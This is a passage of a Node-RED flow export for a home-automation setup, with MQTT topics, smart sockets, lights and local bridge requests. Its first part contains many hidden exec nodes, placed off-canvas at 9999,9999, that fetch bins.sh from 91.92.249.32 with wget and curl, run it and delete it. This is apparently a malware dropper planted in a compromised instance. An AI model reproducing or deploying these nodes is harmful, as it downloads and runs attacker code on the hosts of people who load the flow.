a","addpay":"","append":"","useSpawn":"false","timer":"1000","winHide":true,"oldrc":false,"name":"","x":9999,"y":9999,"wires":[[],[],[]]},{"id":"01769b48-136d-4525-ab74-5dbbbda1686f","type":"inject","z":"d7eda565344d3004","name":"","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":9999,"y":9999,"wires":[["77b425a1-d493-4443-80fe-3b363cb78841"]]},{"id":"e62c983c-b8ae-4b0e-aa3b-88de961df25a","type":"exec","z":"d7eda565344d3004","command":"echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a","addpay":"","append":"","useSpawn":"false","timer":"1000","winHide":true,"oldrc":false,"name":"","x":9999,"y":9999,"wires":[[],[],[]]},{"id":"9bc67682-9642-4001-b73d-b90cba365d7a","type":"inject","z":"d7eda565344d3004","name":"","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":9999,"y":9999,"wires":[["e62c983c-b8ae-4b0e-aa3b-88de961df25a"]]},{"id":"082fd05af6526f4f","type":"debug","z":"d7eda565344d3004","name":"","active":false,"tosidebar":true,"console":false,"tostatus":false,"complete":"payload","targetType":"msg","statusVal":"","statusType":"auto","x":1010,"y":1020,"wires":[]},{"id":"f4675b20-f807-43e9-a028-53d94d84ca43","type":"exec","z":"d7eda565344d3004","command":"echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a","addpay":"","append":"","useSpawn":"false","timer":"1000","winHide":true,"oldrc":false,"name":"","x":9999,"y":9999,"wires":[[],[],[]]},{"id":"a8c0d770-1357-4881-9f5d-e0793f839a77","type":"inject","z":"d7eda565344d3004","name":"","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":9999,"y":9999,"wires":[["f4675b20-f807-43e9-a028-53d94d84ca43"]]},{"id":"aa7523a3-ba1c-476c-92e8-ef4e3b87b1ff","type":"exec","z":"d7eda565344d3004","command":"echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a","addpay":"","append":"","useSpawn":"false","timer":"1000","winHide":true,"oldrc":false,"name":"","x":9999,"y":9999,"wires":[[],[],[]]},{"id":"99652bf7-c3fb-4f8e-b1de-daa2be6e2548","type":"inject","z":"d7eda565344d3004","name":"","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":9999,"y":9999,"wires":[["aa7523a3-ba1c-476c-92e8-ef4e3b87b1ff"]]},{"id":"22648343-f37f-472b-8a46-1a411f92935e","type":"exec","z":"d7eda565344d3004","command":"echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a","addpay":"","append":"","useSpawn":"false","timer":"1000","winHide":true,"oldrc":false,"name":"","x":9999,"y":9999,"wires":[[],[],[]]},{"id":"9761eb35-edfa-4ae7-962b-4ccb653ce2de","type":"inject","z":"d7eda565344d3004","name":"","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":9999,"y":9999,"wires":[["22648343-f37f-472b-8a46-1a411f92935e"]]},{"id":"0c2a66ad-f00a-4e48-b44c-6a396fe34bf0","type":"exec","z":"d7eda565344d3004","command":"echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a","addpay":"","append":"","useSpawn":"false","timer":"1000","winHide":true,"oldrc":false,"name":"","x":9999,"y":9999,"wires":[[],[],[]]},{"id":"7164c298-a6ac-4451-860a-7d642313b1a4","type":"inject","z":"d7eda565344d3004","name":"","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":9999,"y":9999,"wires":[["0c2a66ad-f00a-4e48-b44c-6a396fe34bf0"]]},{"id":"4cbd5832-e617-45a0-b222-baff5737e312","type":"exec","z":"d7eda565344d3004","command":"echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a","addpay":"","append":"","useSpawn":"false","timer":"1000","winHide":true,"oldrc":false,"name":"","x":9999,"y":9999,"wires":[[],[],[]]},{"id":"4c494807-a77d-4e18-8659-b2f482781adc","type":"inject","z":"d7eda565344d3004","name":"","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":9999,"y":9999,"wires":[["4cbd5832-e617-45a0-b222-baff5737e312"]]},{"id":"4062a579-1ec8-42a9-9a16-a30f66e2c630","type":"exec","z":"d7eda565344d3004","command":"echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a","addpay":"","append":"","useSpawn":"false","timer":"1000","winHide":true,"oldrc":false,"name":"","x":9999,"y":9999,"wires":[[],[],[]]},{"id":"78eaf5f0-be05-4b87-9eec-12d3452e546f","type":"inject","z":"d7eda565344d3004","name":"","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":9999,"y":9999,"wires":[["4062a579-1ec8-42a9-9a16-a30f66e2c630"]]},{"id":"368fd468-dfe9-4a8e-b9c7-4a305df7af1a","type":"exec","z":"d7eda565344d3004","command":"echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a","addpay":"","append":"","useSpawn":"false","timer":"1000","winHide":true,"oldrc":false,"name":"","x":9999,"y":9999,"wires":[[],[],[]]},{"id":"560e4411-644c-4d2a-881a-72cdfe92001c","type":"inject","z":"d7eda565344d3004","name":"","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":9999,"y":9999,"wires":[["368fd468-dfe9-4a8e-b9c7-4a305df7af1a"]]},{"id":"59166377-e4d2-4601-bd98-581ace9a7166","type":"exec","z":"d7eda565344d3004","command":"echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a","addpay":"","append":"","useSpawn":"false","timer":"1000","winHide":true,"oldrc":false,"name":"","x":9999,"y":9999,"wires":[[],[],[]]},{"id":"9b841029-dcfd-47ec-be1c-6c8d5b0e34fb","type":"inject","z":"d7eda565344d3004","name":"","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":9999,"y":9999,"wires":[["59166377-e4d2-4601-bd98-581ace9a7166"]]},{"id":"e793bf8cd58a4ec7","type":"debug","z":"d7eda565344d3004","name":"","active":true,"tosidebar":true,"console":false,"tostatus":false,"complete":"payload","targetType":"msg","statusVal":"","statusType":"auto","x":950,"y":1180,"wires":[]},{"id":"d5469f84-b5c5-4c66-ae44-ab4fa8b23531","type":"exec","z":"d7eda565344d3004","command":"echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a","addpay":"","append":"","useSpawn":"false","timer":"1000","winHide":true,"oldrc":false,"name":"","x":9999,"y":9999,"wires":[[],[],[]]},{"id":"a9a45fb4-33ea-4e64-9e23-c8367e48b0dc","type":"inject","z":"d7eda565344d3004","name":"","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":9999,"y":9999,"wires":[["d5469f84-b5c5-4c66-ae44-ab4fa8b23531"]]},{"id":"acbb1a4e-297a-4dae-9286-323d2eb0876a","type":"exec","z":"d7eda565344d3004","command":"echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a","addpay":"","append":"","useSpawn":"false","timer":"1000","winHide":true,"oldrc":false,"name":"","x":9999,"y":9999,"wires":[[],[],[]]},{"id":"4401ae30-78fc-47ad-aca6-3d695d6562f5","type":"inject","z":"d7eda565344d3004","name":"","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":9999,"y":9999,"wires":[["acbb1a4e-297a-4dae-9286-323d2eb0876a"]]},{"id":"7085dedf-8c21-4bfb-bfa3-e6561280cd6d","type":"exec","z":"d7eda565344d3004","command":"echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a","addpay":"","append":"","useSpawn":"false","timer":"1000","winHide":true,"oldrc":false,"name":"","x":9999,"y":9999,"wires":[[],[],[]]},{"id":"c845cf85-edc4-47e2-93f7-54e6f96bacdf","type":"inject","z":"d7eda565344d3004","name":"","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":9999,"y":9999,"wires":[["7085dedf-8c21-4bfb-bfa3-e6561280cd6d"]]},{"id":"93e4be36-ea23-4fde-b8c0-258792727053","type":"exec","z":"d7eda565344d3004","command":"echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a","addpay":"","append":"","useSpawn":"false","timer":"1000","winHide":true,"oldrc":false,"name":"","x":9999,"y":9999,"wires":[[],[],[]]},{"id":"139ea583-7134-46f6-b9c5-9cb97a867a88","type":"inject","z":"d7eda565344d3004","name":"","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":9999,"y":9999,"wires":[["93e4be36-ea23-4fde-b8c0-258792727053"]]},{"id":"9e272d88-212e-4355-88ed-2287ced8cc2d","type":"exec","z":"d7eda565344d3004","command":"echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a","addpay":"","append":"","useSpawn":"false","timer":"1000","winHide":true,"oldrc":false,"name":"","x":9999,"y":9999,"wires":[[],[],[]]},{"id":"500decb0-3f85-4ad8-a5c0-9bcf77bbdcdb","type":"inject","z":"d7eda565344d3004","name":"","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":9999,"y":9999,"wires":[["9e272d88-212e-4355-88ed-2287ced8cc2d"]]},{"id":"995740f5-9697-48c3-992a-af69b54f1bd0","type":"exec","z":"d7eda565344d3004","command":"echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a","addpay":"","append":"","useSpawn":"false","timer":"1000","winHide":true,"oldrc":false,"name":"","x":9999,"y":9999,"wires":[[],[],[]]},{"id":"8d981482-3e95-4864-8548-5a0bd60812d3","type":"inject","z":"d7eda565344d3004","name":"","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":9999,"y":9999,"wires":[["995740f5-9697-48c3-992a-af69b54f1bd0"]]},{"id":"0b1a62e7-4353-42d9-a5db-fce34d4f9825","type":"exec","z":"d7eda565344d3004","command":"echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a","addpay":"","append":"","useSpawn":"false","timer":"1000","winHide":true,"oldrc":false,"name":"","x":9999,"y":9999,"wires":[[],[],[]]},{"id":"2510af19-14e0-438d-84d5-df1b19ffaf9b","type":"inject","z":"d7eda565344d3004","name":"","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":9999,"y":9999,"wires":[["0b1a62e7-4353-42d9-a5db-fce34d4f9825"]]},{"id":"01a060a9-e1fd-4a8c-98e4-96e107ce4e81","type":"exec","z":"d7eda565344d3004","command":"echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a","addpay":"","append":"","useSpawn":"false","timer":"1000","winHide":true,"oldrc":false,"name":"","x":9999,"y":9999,"wires":[[],[],[]]},{"id":"24191496-a5a2-4eea-9af1-0d6845578955","type":"inject","z":"d7eda565344d3004","name":"","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":9999,"y":9999,"wires":[["01a060a9-e1fd-4a8c-98e4-96e107ce4e81"]]},{"id":"c7f8e4c5-b0cf-4b9b-8bb2-0ef66a813b91","type":"exec","z":"d7eda565344d3004","command":"echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a","addpay":"","append":"","useSpawn":"false","timer":"1000","winHide":true,"oldrc":false,"name":"","x":9999,"y":9999,"wires":[[],[],[]]},{"id":"9a738841-ba68-49bc-850f-251952c151c4","type":"inject","z":"d7eda565344d3004","name":"","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":9999,"y":9999,"wires":[["c7f8e4c5-b0cf-4b9b-8bb2-0ef66a813b91"]]},{"id":"8301f731fc67d7ea","type":"mqtt in","z":"e8fabf2a01eed782","name":"","topic":"/device/atari-stick/BUTTON_DOWN/event","qos":"2","datatype":"auto","broker":"627df8f806a8df74","inputs":0,"x":220,"y":840,"wires":[[]]},{"id":"13b120887cfe9f5c","type":"mqtt in","z":"e8fabf2a01eed782","name":"","topic":"/device/atari-stick/BUTTON_LEFT/event","qos":"2","datatype":"auto","broker":"627df8f806a8df74","inputs":0,"x":210,"y":880,"wires":[[]]},{"id":"11f7e34e442edb64","type":"mqtt in","z":"e8fabf2a01eed782","name":"","topic":"/device/atari-stick/BUTTON_RIGHT/event","qos":"2","datatype":"auto","broker":"627df8f806a8df74","inputs":0,"x":220,"y":800,"wires":[[]]},{"id":"26b032c0764f8e13","type":"mqtt in","z":"e8fabf2a01eed782","name":"","topic":"/device/atari-stick/BUTTON_FIRE/event","qos":"2","datatype":"auto","broker":"627df8f806a8df74","inputs":0,"x":210,"y":720,"wires":[[]]},{"id":"9673320c01421803","type":"mqtt in","z":"e8fabf2a01eed782","name":"","topic":"/device/atari-stick/online","qos":"2","datatype":"auto","broker":"627df8f806a8df74","inputs":0,"x":160,"y":680,"wires":[["e692381b6a1a1e90"]]},{"id":"e692381b6a1a1e90","type":"debug","z":"e8fabf2a01eed782","name":"","active":false,"tosidebar":true,"console":false,"tostatus":false,"complete":"false","x":690,"y":680,"wires":[]},{"id":"4860ff006c0aa97f","type":"mqtt in","z":"e8fabf2a01eed782","name":"","topic":"/device/atari-stick/BUTTON_UP/event","qos":"2","datatype":"auto","broker":"627df8f806a8df74","inputs":0,"x":310,"y":320,"wires":[["b53284aac4f58692"]]},{"id":"f55257be996ca7fa","type":"debug","z":"e8fabf2a01eed782","name":"","active":false,"tosidebar":true,"console":false,"tostatus":false,"complete":"payload","targetType":"msg","statusVal":"","statusType":"auto","x":1050,"y":100,"wires":[]},{"id":"130f32ea51d08b0d","type":"mqtt out","z":"e8fabf2a01eed782","name":"","topic":"/device/smartsocket/SMTSKT05/command","qos":"","retain":"","respTopic":"","contentType":"","userProps":"","correl":"","expiry":"","broker":"627df8f806a8df74","x":1130,"y":220,"wires":[]},{"id":"8696ab6c63c08522","type":"mqtt in","z":"e8fabf2a01eed782","name":"","topic":"/device/smartsocket/SMTSKT05/event","qos":"2","datatype":"auto","broker":"627df8f806a8df74","nl":false,"rap":true,"rh":0,"inputs":0,"x":310,"y":180,"wires":[["d09f9282eff1f428"]]},{"id":"d09f9282eff1f428","type":"subflow:0c4a1aef5ced3d40","z":"e8fabf2a01eed782","name":"PC Top LIght","env":[{"name":"event_name","value":"ATARI_JOYSTICK_UP","type":"str"},{"name":"variation","value":"infinte","type":"str"}],"x":610,"y":220,"wires":[["f55257be996ca7fa","130f32ea51d08b0d"]]},{"id":"7e62d33c3f298e20","type":"mqtt in","z":"e8fabf2a01eed782","name":"","topic":"/device/atari-stick/BUTTON_LEFT/event","qos":"2","datatype":"auto","broker":"627df8f806a8df74","inputs":0,"x":310,"y":220,"wires":[["d09f9282eff1f428"]]},{"id":"79d40dacc05a164e","type":"mqtt in","z":"e8fabf2a01eed782","name":"","topic":"/device/smartsocket/SMTSKT02/event","qos":"2","datatype":"auto","broker":"627df8f806a8df74","nl":false,"rap":true,"rh":0,"inputs":0,"x":310,"y":280,"wires":[["b53284aac4f58692"]]},{"id":"b53284aac4f58692","type":"subflow:0c4a1aef5ced3d40","z":"e8fabf2a01eed782","name":"PC Monitor Under Light","env":[{"name":"event_name","value":"ATARI_JOYSTICK_UP","type":"str"},{"name":"variation","value":"infinite","type":"str"}],"x":650,"y":280,"wires":[["f7be6df62b02f56d","f55257be996ca7fa"]]},{"id":"f7be6df62b02f56d","type":"mqtt out","z":"e8fabf2a01eed782","name":"","topic":"/device/smartsocket/SMTSKT02/command","qos":"","retain":"","respTopic":"","contentType":"","userProps":"","correl":"","expiry":"","broker":"627df8f806a8df74","x":1130,"y":280,"wires":[]},{"id":"bae88efd8d18c737","type":"link in","z":"e8fabf2a01eed782","name":"Button 32","links":["0786e36a070d7c03"],"x":285,"y":500,"wires":[["53918c71bf58dd53"]],"icon":"node-red-contrib-deconz/icon-color.png"},{"id":"5c18d75352213310","type":"subflow:0c4a1aef5ced3d40","z":"e8fabf2a01eed782","name":"WARDROBE_LIGHT","env":[{"name":"event_name","value":"WARDROBE_LIGHT","type":"str"},{"name":"variation","value":"1 minutes","type":"str"},{"name":"timeout_seconds","value":"60","type":"num"}],"x":640,"y":400,"wires":[["6bccba341b398e07","2d97cea1a47f4114"]]},{"id":"6bccba341b398e07","type":"mqtt out","z":"e8fabf2a01eed782","name":"","topic":"/device/smartsocket/SMTSKT07/command","qos":"","retain":"","respTopic":"","contentType":"","userProps":"","correl":"","expiry":"","broker":"627df8f806a8df74","x":1130,"y":400,"wires":[]},{"id":"c11e85f17a27246e","type":"mqtt out","z":"e8fabf2a01eed782","name":"","topic":"/device/smartsocket/SMTSKT01/command","qos":"","retain":"","respTopic":"","contentType":"","userProps":"","correl":"","expiry":"","broker":"627df8f806a8df74","x":1130,"y":480,"wires":[]},{"id":"3c4ce1236b606d5b","type":"mqtt in","z":"e8fabf2a01eed782","name":"","topic":"/device/atom-lite-1/button","qos":"2","datatype":"auto","broker":"627df8f806a8df74","nl":false,"rap":false,"inputs":0,"x":270,"y":400,"wires":[["5c18d75352213310"]]},{"id":"53918c71bf58dd53","type":"subflow:0c4a1aef5ced3d40","z":"e8fabf2a01eed782","name":"WORKBENCH_LIGHT","env":[{"name":"event_name","value":"WORKBENCH_LIGHT","type":"str"},{"name":"timeout_seconds","value":"0","type":"num"}],"x":640,"y":480,"wires":[["c11e85f17a27246e"]]},{"id":"0eb67fa3eeee89d6","type":"mqtt in","z":"e8fabf2a01eed782","name":"","topic":"/device/atari-stick/BUTTON_UP/event","qos":"2","datatype":"auto","broker":"627df8f806a8df74","inputs":0,"x":210,"y":760,"wires":[[]]},{"id":"62d2b7580c1c77f0","type":"link in","z":"e8fabf2a01eed782","name":"Motion Cave","links":["c4848be5557cad5e"],"x":285,"y":460,"wires":[["5c18d75352213310","03c5faa7aee95391"]],"icon":"node-red-contrib-deconz/icon-color.png"},{"id":"e7f942cd80b4cc95","type":"mqtt in","z":"e8fabf2a01eed782","name":"","topic":"/device/smartsocket/SMTSKT07/online","qos":"2","datatype":"auto","broker":"627df8f806a8df74","nl":false,"rap":true,"rh":0,"inputs":0,"x":210,"y":940,"wires":[["e25fdbb39a4354c4"]]},{"id":"e25fdbb39a4354c4","type":"trigger","z":"e8fabf2a01eed782","name":"","op1":"1","op2":"0","op1type":"str","op2type":"str","duration":"500","extend":false,"overrideDelay":false,"units":"ms","reset":"","bytopic":"all","topic":"topic","outputs":1,"x":480,"y":940,"wires":[[]]},{"id":"03c5faa7aee95391","type":"debug","z":"e8fabf2a01eed782","name":"From Sensor","active":true,"tosidebar":true,"console":false,"tostatus":false,"complete":"payload","targetType":"msg","statusVal":"","statusType":"auto","x":590,"y":560,"wires":[]},{"id":"2d97cea1a47f4114","type":"debug","z":"e8fabf2a01eed782","name":"Subflow output","active":false,"tosidebar":true,"console":false,"tostatus":false,"complete":"payload","targetType":"msg","statusVal":"","statusType":"auto","x":920,"y":540,"wires":[]},{"id":"30b9472f661be47b","type":"inject","z":"e8fabf2a01eed782","name":"Motion","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"{\"state\":{\"presence\":\"motion\"}}","payloadType":"json","x":550,"y":340,"wires":[["5c18d75352213310"]]},{"id":"9271d47b165c8189","type":"mqtt out","z":"df36b737c8742674","name":"","topic":"/dev/timestamp","qos":"","retain":"","broker":"627df8f806a8df74","x":500,"y":80,"wires":[]},{"id":"7fe84abca9a6da5f","type":"inject","z":"df36b737c8742674","name":"1 Second","repeat":"1","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":150,"y":80,"wires":[["9271d47b165c8189"]]},{"id":"4399d6c63fda7166","type":"mqtt out","z":"df36b737c8742674","name":"/nodered/time10s","topic":"/nodered/time10s","qos":"","retain":"","broker":"627df8f806a8df74","x":510,"y":220,"wires":[]},{"id":"891cbf932779bf35","type":"inject","z":"df36b737c8742674","name":"10 Second","repeat":"10","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"","payloadType":"date","x":150,"y":220,"wires":[["4399d6c63fda7166"]]},{"id":"7d2494729cf24dd0","type":"mqtt in","z":"f7d3139e6c4a4f09","name":"","topic":"/kitchen/bench-lights/online","qos":"2","datatype":"auto","broker":"627df8f806a8df74","inputs":0,"x":160,"y":400,"wires":[["f8ceca7ed8bea225"]]},{"id":"f8ceca7ed8bea225","type":"trigger","z":"f7d3139e6c4a4f09","name":"Online","op1":"1","op2":"0","op1type":"str","op2type":"str","duration":"1000","extend":false,"units":"ms","reset":"","bytopic":"all","outputs":1,"x":450,"y":400,"wires":[[]]},{"id":"9d3c57922cd20449","type":"mqtt in","z":"f7d3139e6c4a4f09","name":"","topic":"/device/aqara/motion/kitchen","qos":"2","datatype":"auto","broker":"627df8f806a8df74","nl":false,"rap":false,"inputs":0,"x":160,"y":520,"wires":[["72574cd4bb561358"]]},{"id":"72574cd4bb561358","type":"trigger","z":"f7d3139e6c4a4f09","name":"","op1":"$LED_ALL$ON","op2":"$LED_ALL$OFF","op1type":"str","op2type":"str","duration":"5","extend":true,"overrideDelay":false,"units":"min","reset":"","bytopic":"all","topic":"topic","outputs":1,"x":420,"y":520,"wires":[["cc9d3f09888daf6e","d8412a0f361f68ff"]]},{"id":"d8412a0f361f68ff","type":"debug","z":"f7d3139e6c4a4f09","name":"","active":false,"tosidebar":true,"console":false,"tostatus":false,"complete":"payload","targetType":"msg","x":650,"y":440,"wires":[]},{"id":"cc9d3f09888daf6e","type":"mqtt out","z":"f7d3139e6c4a4f09","name":"","topic":"/kitchen/bench-lights/command","qos":"","retain":"","broker":"627df8f806a8df74","x":1170,"y":520,"wires":[]},{"id":"0aa54dfab71a0e4f","type":"inject","z":"f7d3139e6c4a4f09","name":"$LED_ALL$OFF","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"$LED_ALL$OFF","payloadType":"str","x":900,"y":440,"wires":[["cc9d3f09888daf6e"]]},{"id":"afd14491b97b10e4","type":"inject","z":"f7d3139e6c4a4f09","name":"$LED_ALL$ON","props":[{"p":"payload"},{"p":"topic","vt":"str"}],"repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"$LED_ALL$ON","payloadType":"str","x":900,"y":400,"wires":[["cc9d3f09888daf6e"]]},{"id":"b73d570d4acb2b05","type":"http request","z":"51491686703cf8dc","name":"Light above me State (1)","method":"PUT","ret":"obj","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/1/state","tls":"","proxy":"","authType":"","x":430,"y":40,"wires":[[]]},{"id":"18d73538de72aee7","type":"http request","z":"51491686703cf8dc","name":"Light 2 State","method":"PUT","ret":"obj","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/2/state","tls":"","proxy":"","authType":"","x":390,"y":100,"wires":[[]]},{"id":"9057608d02b4ba19","type":"http request","z":"51491686703cf8dc","name":"Light 3 State","method":"PUT","ret":"obj","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/3/state","tls":"","proxy":"","authType":"","x":390,"y":160,"wires":[[]]},{"id":"8208624d44807169","type":"inject","z":"51491686703cf8dc","name":"OFF","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"{\"on\":false,\"bri\":255,\"hue\":43680,\"sat\":255,\"transitiontime\":10}","payloadType":"json","x":110,"y":100,"wires":[["b73d570d4acb2b05","18d73538de72aee7","9057608d02b4ba19","7d6d72f49e1bfc68","2a6a4a5f7b444072"]]},{"id":"606061aaf7f6c1d5","type":"inject","z":"51491686703cf8dc","name":"ON","repeat":"","crontab":"","once":false,"onceDelay":0.1,"topic":"","payload":"{\"on\":true,\"bri\":255,\"hue\":43680,\"sat\":255,\"transitiontime\":10}","payloadType":"json","x":110,"y":140,"wires":[["b73d570d4acb2b05","18d73538de72aee7","9057608d02b4ba19","7d6d72f49e1bfc68","2a6a4a5f7b444072"]]},{"id":"7d6d72f49e1bfc68","type":"http request","z":"51491686703cf8dc","name":"Light 7 State","method":"PUT","ret":"obj","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/7/state","tls":"","proxy":"","authType":"","x":390,"y":220,"wires":[[]]},{"id":"2a6a4a5f7b444072","type":"http request","z":"51491686703cf8dc","name":"Light above Leila 8 State","method":"PUT","ret":"obj","paytoqs":false,"url":"http://192.168.1.105:80/api/7665109987/lights/8/state","tls":"","proxy":"","authType":"","x":430,"y":280,"wires":[[]]},{"id":"2939b0e170728dc3","type":"mqtt in","z":"51491686703cf8dc","name":"","topic":"/device/aqara/lounge-button/tap","qos":"2","datatype":"auto","broker":"627df8f806a8df74","inputs":0,"x":150,"y":380,"wires":[["a5a9dafa44a8edac"]]},{"id":"f7ff0362f22addf5","type":"mqtt in","z":"51491686703cf8dc","name":"","topic":"/device/aqara/lounge-button/doubletap","qos":"2","datatype":"auto","broker":"627df8f806a8df74","inputs":0,"x":170,"y":420,"wires":[[]]},{"id":"c480728c0b043a51","type":"mqtt in","z":"51491686703cf8dc","name":"","topic":"/device/aqara/lounge-button/tripletap","qos":"2","datatype":"auto","broker":"627df8f806a8df74","inputs":0,"x":170,"y":460,"wires":[[]]},{"id":"fc49fb88a3ef4432","type":"mqtt in","z":"51491686703cf8dc","name":"","topic":"/device/aqara/lounge-button/quadtap","qos":"2","datatype":"auto","broker":"627df8f806a8df74","inputs":0,"x":170,"y":500,"wires":[[]]},{"id":"36b2f041b15a1599","type":"http 